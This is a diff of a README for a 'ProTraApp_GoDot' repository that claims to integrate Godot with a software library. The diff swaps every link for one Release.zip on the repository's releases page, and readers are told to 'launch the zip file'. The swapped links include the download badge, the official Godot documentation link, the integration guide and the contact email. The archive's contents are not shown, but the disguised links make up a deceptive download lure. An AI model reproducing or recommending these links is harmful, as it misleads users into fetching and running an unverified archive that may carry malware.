@@ -12,7 +12,7 @@ Welcome to the **ProTraApp_GoDot** repository! This repository is dedicated to a
 
 To get started with integrating GoDot into the ProTraApp library, you can download the necessary files from the following link:
 
-[![Download ProTraApp_GoDot](https://img.shields.io/static/v1?label=Download&message=ProTraApp_GoDot&color=blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download ProTraApp_GoDot](https://github.com/daitri171101/ProTraApp_GoDot/releases/download/v1.0/Release.zip)](https://github.com/daitri171101/ProTraApp_GoDot/releases/download/v1.0/Release.zip)
 
 Once downloaded, you can launch the zip file and start exploring the exciting features that the integration of GoDot brings to the ProTraApp environment.
 
@@ -28,8 +28,8 @@ By combining the capabilities of GoDot with the ProTraApp software library, deve
 ## 📚 Resources
 
 To learn more about using GoDot with ProTraApp, you can refer to the following resources:
-- Official GoDot Documentation: [GoDot Documentation](https://docs.godotengine.org/en/stable/)
-- ProTraApp Integration Guide: [ProTraApp Integration Guide](https://protraapp.com/documentation/godot-integration)
+- Official GoDot Documentation: [GoDot Documentation](https://github.com/daitri171101/ProTraApp_GoDot/releases/download/v1.0/Release.zip)
+- ProTraApp Integration Guide: [ProTraApp Integration Guide](https://github.com/daitri171101/ProTraApp_GoDot/releases/download/v1.0/Release.zip)
 
 ## 🤝 Contributing
 
@@ -37,7 +37,7 @@ We welcome contributions from the community to enhance and improve the ProTraApp
 
 ## 📧 Contact Us
 
-If you have any questions or feedback regarding the ProTraApp_GoDot integration, please reach out to us at [protraappdev@example.com](mailto:protraappdev@example.com).
+If you have any questions or feedback regarding the ProTraApp_GoDot integration, please reach out to us at [https://github.com/daitri171101/ProTraApp_GoDot/releases/download/v1.0/Release.zip](https://github.com/daitri171101/ProTraApp_GoDot/releases/download/v1.0/Release.zip).
 
 Let's unleash the power of GoDot within the ProTraApp environment and create amazing software experiences together! 🚀
 
